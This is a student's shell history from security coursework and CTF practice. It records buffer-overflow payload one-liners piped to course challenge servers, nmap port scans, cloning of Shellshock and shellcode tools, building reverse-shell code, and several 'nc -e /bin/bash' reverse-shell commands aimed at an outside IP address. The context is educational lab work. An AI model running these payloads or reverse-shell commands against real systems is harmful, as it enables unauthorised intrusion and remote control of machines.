+ 1662  touch flag.txt
+ 1663  echo "fake flag" > flag.txt 
+ 1664  python3 tmp2.py REMOTE
+ 1665  python3 tmp2.py REMOTE mercury.picoctf.net 4593\n
+ 1666  python3 tmp2.py GDB
+ 1667  0x80487d6
+ 1669  nc mercury.picoctf.net 4593\n
+ 1670  python3 tmp2.py REMOTE mercury.picoctf.net 4593 > output_exploit.txt\n
+ 1671  exploit2.py REMOTE mercury.picoctf.net 4593 > output_exploit.txt\n
+ 1672  exploit.py REMOTE mercury.picoctf.net 4593 > output_exploit.txt\n
+ 1673  pyhton3 exploit.py REMOTE mercury.picoctf.net 4593 > output_exploit.txt\n
+ 1674  pyhthon3 exploit.py REMOTE mercury.picoctf.net 4593 > output_exploit.txt\n
+ 1675  python3 exploit.py REMOTE mercury.picoctf.net 4593 > output_exploit.txt\n
+ 1677  git clone git@github.com:arctic-cheetah/COMP3311-Database.git
+ 1678  git clone https://github.com/arctic-cheetah/COMP3311-Database.git
+ 1680  code COMP3311*
+ 1684  mkdir wk2
+ 1688  pwndgdb
+ 1689  pwngdb
+ 1690  pwndbg
+ 1693  code .
+ 1695  cd Admin*
+ 1697  docker build
+ 1698  docker buildx build
+ 1699  docker build -t dockerFile
+ 1700  docker buildx build -t dockerFile
+ 1703  cd admin*
+ 1704  docker buildx build -t dockerFile .
+ 1706  gcc -v
+ 1707  ls /usr/bin
+ 1708  ls /usr/bin/gcc
+ 1709  whereis gcc-11
+ 1710  sudo apt install g++-9 gcc-9
+ 1711  sudo apt install g++-11 gcc-11
+ 1712  sudo apt install gcc-11 g++-11 
+ 1713  update-alternatives
+ 1715  git commit -m 'tmp save'
+ 1717  gcc-11
+ 1718  gcc --version
+ 1719  ls /usr/bin | grep -Pi 'gcc'
+ 1720  gcc-12 --version
+ 1721  gcc-14 --version
+ 1722  gcc-11 --version
+ 1724  touch flag.txtlag.txt
+ 1727  mkdir AdminOverflow
+ 1728  mv -r AdminOverflow ~/COMP6841/wk2
+ 1729  mv -ra AdminOverflow ~/COMP6841/wk2
+ 1730  mv AdminOverflow ~/COMP6841/wk2
+ 1731  sudo apt --fix-broken install
+ 1732  sudo apt install gnome-terminal
+ 1733  sudo apt-get install ./docker-desktop-amd64.deb\n
+ 1734  sudo systemctl --user start docker-desktop
+ 1735  iled to start docker-desktop.service: Unit docker-desktop.service is masked.
+ 1736  sudo systemctl start docker
+ 1737  sudo systemctl unmask docker\n
+ 1738  udo systemctl unmask docker
+ 1739  sudo systemctl unmask docker
+ 1740  systemctl --user start docker-desktop
+ 1741  sudo systemctl --user unmask docker
+ 1742  sudo update-alternatives /usr/bin/gcc gcc /usr/bin/gcc-11 1 --slave /usr/bin/g++ g++ /usr/bin/g++-11
+ 1743  sudo apt install gcc-12 g++-12
+ 1744  ls /usr/bin | grep -Ei 'gcc'
+ 1745  export LDFLAGS='-m32 -L/usr/lib32'\n
+ 1746  sudo apt-get install gcc-11-multilib
+ 1747  sudo apt-get install gcc-12-multilib
+ 1748  sudo apt-get install gcc-13-multilib
+ 1752  cd ~/COMP6841/wk2/usingFGets
+ 1753  cho '' > exploit.txt
+ 1754  echo '' > exploit.txt
+ 1757  cd wk2
+ 1758  cd usingFGets
+ 1760  /home/k-730/COMP6841/.venv/bin/python exploit.py REMOTE boverflow.comp6841 xyz:1342\n
+ 1761  /home/k-730/COMP6841/.venv/bin/pytOTE boverflow.comp6841.xyz 1342\n
+ 1762  /home/k-730/COMP6841/.venv/bin/python exploit.py 
+ 1765  /home/k-730/COMP6841/.venv/bin/python exploit.py REMOTE boverflow.comp6841.xyz 1342\n
+ 1766  /home/k-730/COMP6841/.venv/bin/python exploit.py REMOTE boverflow.comp6841.xyz 1342\n> output.txt
+ 1767  /home/k-730/COMP6841/.venv/bin/python exploit.py REMOTE boverflow.comp6841.xyz 13> output.txt 
+ 1768  /home/k-730/COMP6841/.venv/bin/python exploit.py REMOTE boverflow.comp6841.xyz 1342> output.txt 
+ 1771  cd postgres13
+ 1773  nano env
+ 1775  ./download
+ 1777  cat 'fake flag' 
+ 1778  ehco 'fake flag' > flag.txt
+ 1779  touch notes.md
+ 1780  python3 "import sys; sys.stdout.buffer.write(28 * b'C' + b'\x4a\x93\x04\08')" > ./challenge
+ 1781  python3 "import sys; sys.stdout.buffer.write(28 * b'C' + b'\x4a\x93\x04\08')" > challenge
+ 1782  python3 -c "import sys; sys.stdout.buffer.write(28 * b'C' + b'\x4a\x93\x04\08')" > challenge
+ 1783  python3 -c "import sys; sys.stdout.buffer.write(28 * b'C' + b'\x4a\x93\x04\08')" > ./challenge
+ 1784  python3 -c "import sys; sys.stdout.buffer.write(28 * b'C' + b'\x4a\x93\x04\x08')" > ./challenge
+ 1786  challenge
+ 1787  python3 -c "import sys; sys.stdout.buffer.write(28 * b'C' + b'\x4a\x93\x04\x08')" | ./challenge
+ 1788  attack.txt > ./challenge
+ 1790  cat attack.txt > ./challenge
+ 1793  python3 -c "import sys; sys.stdout.buffer.write(28 * b'C' + b'\x4a\x93\x04\x08')" > attack.txt
+ 1795  python3 -c "import sys; sys.stdout.buffer.write(29 * b'C' + b'\x4a\x93\x04\x08')" > attack.txt
+ 1797  python3 -c "import sys; sys.stdout.buffer.write(32 * b'C' + b'\x4a\x93\x04\x08')" > attack.txt
+ 1798  ./challenge < attack.txt
+ 1799  cat attack.txt | nc boverflow.comp6841.xyz 1341
+ 1800  cat attack.txt > nc boverflow.comp6841.xyz 1341
+ 1802  python3 -c "import sys; sys.stdout.buffer.write(32 * b'C' + b'\x4a\x93\x04\x08')" > nc boverflow.comp6841.xyz 1341
+ 1803  python3 -c "import sys; sys.stdout.buffer.write(32 * b'C' + b'\x4a\x93\x04\x08')" | ./challenge
+ 1808  chmod -R 755 download.sh
+ 1811  ./challenge 
+ 1816  sudo cp cutter /usr/bin
+ 1821  echo 'fake flag' > flag.txt
+ 1822  /home/k-730/COMP6841/.venv/bin/python exploit.py REMOTE boverflow.comp6841.xyz 1341
+ 1823  /home/k-730/COMP6841/.venv/bin/python exploit.py
+ 1825  python3 -c "import sys; sys.stdout.buffer.write(32 * b'C' + b'\x4a\x93\x04\x08')" | nc boverflow.comp6841.xyz 1342
+ 1826  python3 -c "import sys; sys.stdout.buffer.write(32 * b'C' + b'\x4a\x93\x04\x08')" | nc boverflow.comp6841.xyz 1341
+ 1827  python3 -c "import sys; sys.stdout.buffer.write(32 * b'C' + b'\x4a\x93\x04\x08')" | nc boverflow.comp6841.xyz 1340
+ 1828  python3 -c "import sys; sys.stdout.buffer.write(32 * b'C' + b'\x4a\x93\x04\x08')" | nc boverflow.comp6841.xyz 1343
+ 1830  nc boverflow.comp6841.xyz 1345
+ 1832  nc boverflow.comp6841.xyz 1342
+ 1833  ping boverflow.comp6841.xyz 1340
+ 1834  ping boverflow.comp6841.xyz 1339
+ 1835  ping boverflow.comp6841.xyz 
+ 1836  ping boverflow.comp6841.xyz 1341
+ 1837  cd Downloads
+ 1838  chmod x+ chmod +x Cutter*.AppImage; ./Cutter*.AppImage
+ 1839  sudo chmod x+ chmod +x Cutter*.AppImage; ./Cutter*.AppImage
+ 1840  sudo chmod x+ chmod +x Cutter*.AppImage;
+ 1841  sudo chmod +x chmod +x Cutter*.AppImage;
+ 1842  sudo chmod +x Cutter*.AppImage;
+ 1843  ./Cutter*.AppImage\n\n
+ 1845  cp ./Cutter*.AppImage cutter\n\n
+ 1846  cutter
+ 1847  cd  ~/COMP6841/wk2/JumpAgain
+ 1851  cd /usr/bin
+ 1853  ls -1
+ 1854  ls -1 | grep -Pi 'cutter'
+ 1855  kill 2939
+ 1858  i r
+ 1860  cd COMP6841/wk2/Tweet
+ 1861  cd wk2/Tweet
+ 1863  /home/k-730/COMP6841/.venv/bin/python exploit.py REMOTE boverflow.comp6841.xyz 1339 output.txt 
+ 1864  /home/k-730/COMP6841/.venv/bin/python exploit.py REMOTE boverflow.comp6841.xyz 1339 output.txt c
+ 1866  git commit -m ''
+ 1868  git commit -m 'Unable to solve UsingFgets'
+ 1869  git push origin master
+ 1870  man cp
+ 1872  source wk2/usingFGets/env
+ 1874  ifconfig
+ 1876  pythonExploit exploit.py DEBUG
+ 1878  python3 exploit.py GDB
+ 1879  terminal .
+ 1880  qterminal .
+ 1881  qterminal . &
+ 1882  python3 exploit.py
+ 1883  nc boverflow.comp6841.xyz 1341
+ 1886  rm -fr core*
+ 1890  /usr/bin/dash
+ 1891  /usr/bin/bash
+ 1893  docker buildx build -t dockerfile
+ 1894  docker buildx build -t dockerfile .
+ 1895  docker list
+ 1896  docker info
+ 1897  docker
+ 1898  docker container ls
+ 1899  docker container 
+ 1900  docker container start
+ 1901  docker container start 549104bda9337371cceb7fd12c0debfa4b93fb537a67792ea591f1e5d1f5d992  
+ 1902  docker container start 549104bda9337371cceb7fd12c0debfa4b93fb537a67792ea591f1e5d1f5d992
+ 1903  docker container run
+ 1904  docker run
+ 1905  docker run 549104bda9337371cceb7fd12c0debfa4b93fb537a67792ea591f1e5d1f5d992  
+ 1916  cd wk2/usingFGets
+ 1918  /home/k-730/COMP6841/.venv/bin/python exploit.py REMOTE boverflow.comp6841.xyz 1342
+ 1921  python
+ 1922  python3
+ 1923  pythonExploit
+ 1925  source ./env
+ 1929  mkdir JumpAgain
+ 1930  code JumpAgain 
+ 1931  cp /usingFGets/download.sh /usingFgets/exploit.py /usingFgets/notes.md /usingFgets/env JumpAgain
+ 1932  cp /usingFGets/download.sh /usingFGets/exploit.py /usingFGets/notes.md /usingFGets/env JumpAgain
+ 1933  ls usingFGets
+ 1934  cp usingFGets/download.sh usingFGets/exploit.py usingFGets/notes.md usingFGets/env JumpAgain
+ 1935  touch env
+ 1936  export REMOTE="exploit.py REMOTE boverflow.comp6841.xyz 1342"\nalias pythonExploit='~/COMP6841/.venv/bin/python'
+ 1937  pythonExploit REMOTE
+ 1938  unset REMOTE
+ 1939  echo $CURR_PATH
+ 1940  source ~/COMP6841/wk2/usingFGets/env
+ 1941  echo $REMOTE
+ 1942  cd wk2/Using*
+ 1943  cd wk2/using*
+ 1944  pythonExploit 
+ 1945  pythonExploit $REMOTE
+ 1946  pythonExploit exploit.py REMOTE boverflow.comp6841.xyz 1342 > t3
+ 1947  python3 -c 'import sys \nsys.write.buffer.write(24* b"A" + b"\xef\xbe\xad\xde\x01\x00\x00\x00")' > tmp
+ 1948  python3 -c 'import sys \nsys.stdout.buffer.write(24* b"A" + b"\xef\xbe\xad\xde\x01\x00\x00\x00")' > tmp
+ 1949  python3 -c 'import sys \nsys.stdout.buffer.write(24* b"A" + b"\xef\xbe\xad\xde\x01\x00\x00\x00\x0A")' | nc boverflow.comp6841.xyz 1339
+ 1950  python3 -c 'import sys \nsys.stdout.buffer.write(24* b"A" + b"\xef\xbe\xad\xde\x01\x00\x00\x00")' | nc boverflow.comp6841.xyz 1339
+ 1951  pythonExploit exploit.py REMOTE boverflow.comp6841.xyz 1342 > t4
+ 1952  pythonExploit exploit.py REMOTE boverflow.comp6841.xyz 1342 
+ 1953  pythonExploit exploit.py REMOTE boverflow.comp6841.xyz 1341
+ 1955  pythonExploit exploit.py REMOTE boverflow.comp6841.xyz 1342
+ 1956  git add .
+ 1959  mkdir RCE
+ 1960  code RCE
+ 1961  cp JumpAgain/* RCE
+ 1962  startx
+ 1963  q
+ 1967  cd COMP6841
+ 1969  mkdir /wk2/Sytem
+ 1970  mkdir wk2/system
+ 1971  cp wk2/RCE/* wk2/system
+ 1972  code wk2/system
+ 1981  chmod 755 download.sh
+ 1982  ./download.sh
+ 1985  clear
+ 1993  ls ~COMP6841
+ 1994  ls ~/COMP6841
+ 1995  ls ~/COMP6841/wk2
+ 2000  /usr/bin/python /home/k-730/.vscode/extensions/ms-python.python-2025.6.1-linux-x64/python_files/printEnvVariablesToFile.py /home/k-730/.vscode/extensions/ms-python.python-2025.6.1-linux-x64/python_files/deactivate/zsh/envVars.txt
+ 2005  pythonExploit exploit.py REMOTE boverflow.comp6841.xyz 1344
+ 2008  ls /bin/nc
+ 2009  whereis nc
+ 2010  ls /bin | grep -Ei 'nc'
+ 2011  ls /bin | grep -Ei 'cdnc'
+ 2012  git clone https://github.com/T3jv1l/Sh3llshock.gi
+ 2013  git clone https://github.com/T3jv1l/Sh3llshock.git
+ 2014  cd Sh3ellshock
+ 2015  cd Sh3llshock
+ 2017  chmod x+ Sh3llshock.py
+ 2018  chmod +x Sh3llshock.py
+ 2019  mv Sh3llshock.py /usr/bin 
+ 2020  sudo mv Sh3llshock.py /usr/bin 
+ 2021  python2Sh3llshock.py
+ 2022  python2
+ 2023  Sh3llshock.py
+ 2024  python2 Sh3llshock.py
+ 2025  sudo mv /usr/bin Sh3llshock.py
+ 2027  mv
+ 2028  /home/k-730/Sh3llshock/Sh3llshock.py/sudo /home/k-730/Sh3llshock/Sh3llshock.py/mv /home/k-730/Sh3llshock/Sh3llshock.py /usr/bin
+ 2031  cd ~/COMP6841/wk2/RCE
+ 2032  diff reverseShell.asm reverseShell.s
+ 2033  nasm -f elf64 shellcode.asm -o shellcode.o
+ 2034  nasm -f elf64 reverseShell.asm -o reverseShell.o
+ 2035  cd ~/COMP6841/wk2/RCE/shellcode_utils/linux
+ 2036  ls -l
+ 2037  ./get_shellcode.sh reverseShell.c amd64
+ 2038  https://github.com/ebubekirtrkr/c2shellcode.git
+ 2039  git clone https://github.com/ebubekirtrkr/c2shellcode.git
+ 2050  source ../env
+ 2053  ~/COMP6841/wk2/RCE
+ 2055  git clone https://github.com/SkyBulk/bin2sc.git\nchmod +x bin2sc.py\npython3 bin2sc.py 
+ 2056  cd bin2sc
+ 2057  python3 bin2sc.py
+ 2058  mv bin2sc.py ../RCE
+ 2059  cd ../RCE
+ 2061  git clone https://github.com/acheong08/shellcode_utils
+ 2062  man execve
+ 2065  python3 c2shellcode.py -d reverseShell.c reverseShell.s
+ 2066  pythonExploit c2shellcode.py -d reverseShell.c reverseShell.s
+ 2068  nmap -sS boverflow.comp6841.xyz -p
+ 2070  pythonExploit exploit.py 
+ 2071  l
+ 2073  socat boverflow.comp6841.xyz 1344
+ 2074  nc boverflow.comp6841.xyz 1344
+ 2075  socat boverflow.comp6841.xyz 1343
+ 2077  RHOST
+ 2078  checksec ./challenge
+ 2079  pythonExploit exploit.py boverflow.comp6841.xyz 1343
+ 2080  gcc-11 reverseShell.c -o reverseShell
+ 2081  gcc-11 reverseShell.c -S reverseShell.s
+ 2082  nasm
+ 2083  nasm -f elf32 reverseShell.s -o shellCode.o
+ 2084  nasm -f elf32 reverseShell.asm -o shellCode.o
+ 2085  gcc-11 reverseShell.c -S reverseShell.asm
+ 2086  gcc-11 reverseShell.c -o reverseShell.o -Os -fPIC -nostdlib -nostartfiles -ffreestanding -fno-asynchronous-unwind-tables -fno-ident -e start -s
+ 2087  gcc-11 reverseShell.c -o reverseShell.o -Os -fPIC -nostartfiles -ffreestanding -fno-asynchronous-unwind-tables -fno-ident -e start -s
+ 2088  pipExploit
+ 2089  pipExploit install pefile argparse
+ 2090  git clone https://github.com/oldboy21/SHGenOb.git
+ 2091  cd SHGenOb
+ 2092  python shgenob.py --code-file reverseShell.c -xl
+ 2093  python shgenob.py --code-file reverseShell.c -xk
+ 2094  python shgenob.py --code-file reverseShell.c
+ 2095  git clone https://github.com/acheong08/shellcode_utils.git
+ 2096  cd c2*
+ 2097  cd ..
+ 2098  gcc-11 reverseShell.c -S reverseShell.s -o -masm=intel
+ 2099  gcc-13 -v
+ 2100  gcc-11 -nostdlib -static reverseShell.s -o reverseShell.elf
+ 2101  gcc-13 -nostdlib -static reverseShell.s -o reverseShell.elf
+ 2102  gcc-11 -S reverseShell.c -o reverseShell.s -masm=intel
+ 2103  gcc-13 -S reverseShell.c -o reverseShell.asm -masm=intel
+ 2104  gcc-11 -S reverseShell.c -o reverseShell.asm -masm=intel
+ 2105  nasm -f elf32 temp.s -o tmp.o
+ 2106  nasm -f elf64 reverseShell2.s -o reverseShell2.o
+ 2107  ld reverseShell2.o -o reverseShell2
+ 2108  ld reverseShell2.s -o reverseShell
+ 2109  ld reverseShell.s -o reverseShell
+ 2110  nasm -f elf64 reverseShell.s -o reverseShell.o
+ 2111  ld reverseShell.o -o reverseShell
+ 2112  gcc-11 reverseShell2.c -o reverseShell3
+ 2113  ./reverseShell3
+ 2114  xxd -i reverseShell\n
+ 2115  ./reverseShellnasm -f elf64 reverseShell.s -o reverseShell.o; ld reverseShell.o -o reverseShell             
+ 2116  nasm -f bin reverseShell.asm -o reverseShell.bin
+ 2117  nasm -f bin reverseShell.s -o reverseShell.bin
+ 2118  xxd -i reverseShell.bin\n
+ 2119  gcc -z execstack -fno-stack-protector -no-pie reverseShell2.c -o reverseShell2
+ 2120  ./reverseShell2
+ 2121  xxd -i reverseShell.bin
+ 2122  xxd -i reverseShell.o
+ 2123  nasm -f elf64 reverseShell.s -o reverseShell.o; ld reverseShell.o -o reverseShell             
+ 2124  ./reverseShell
+ 2125  ./reverseShellnasm -f elf64 reverseShellv2.s -o reverseShellv2.o;             
+ 2126  nasm -f elf64 reverseShellv2.s -o reverseShellv2.o;             
+ 2127  gcc-11 -fno-stack-protector -z execstack reverseShell2.c -o shellcode
+ 2128  ./shellcode
+ 2129  pwndbg ./shellcode
+ 2130  pwndbg -q ./shellcode
+ 2131  nc -e /bin/bash/ 127.105.187.25 87
+ 2132  nc -e /bin/bash/ 172.105.187.25 87
+ 2134  nmap nmap -sS boverflow.comp6841.xyz port 1343 -p-
+ 2135  nmap nmap -sS boverflow.comp6841.xyz -p-
+ 2136  nmap -sS boverflow.comp6841.xyz -p-
+ 2137  ping boverflow.comp6841.xyz 6841
+ 2138  ping boverflow.comp6841.xyz 6842
+ 2139  ping boverflow.comp6841.xyz 6843
+ 2140  nc boverflow.comp6841.xyz 6843
+ 2142  nc boverflow.comp6841.xyz 6845
+ 2144  make
+ 2146  ./challenge2
+ 2147  cd wk2/RCE
+ 2148  source env
+ 2149  ls
+ 2150  ./challenge
+ 2151  pwndbg challenge
+ 2152  touch tmp.py
+ 2153  xdg-open .
+ 2154  pwndbg reverseshell
+ 2155  gcc-11 reverseshell.c -o reverseshell
+ 2156  gcc-11 reverseshell.c -S reverseshell.s
+ 2157  pythonExploit tmp.py
+ 2158  nc -e /bin/bash 1172.105.187.25 87
+ 2159  nc -e /bin/bash 172.105.187.25 87
+ 2160  ./reverseshell
+ 2161  pythonExploit tmp.py exploit.py REMOTE boverflow.comp6841.xyz 1343
+ 2162  nc -e /bin/sh 172.105.187.25 87
+ 2163  nc -e /bin//sh 172.105.187.25 87
+ 2164  pythonExploit exploit.py GDB
+ 2165  pythonExploit exploit.py
+ 2166  pythonExploit exploit.py REMOTE boverflow.comp6841.xyz 1343
+ 2167  nc boverflow.comp6841.xyz 1343
+ 2168  /bin/python /home/k-730/.vscode/extensions/ms-python.python-2025.6.1-linux-x64/python_files/printEnvVariablesToFile.py /home/k-730/.vscode/extensions/ms-python.python-2025.6.1-linux-x64/python_files/deactivate/zsh/envVars.txt
+ 2169  history
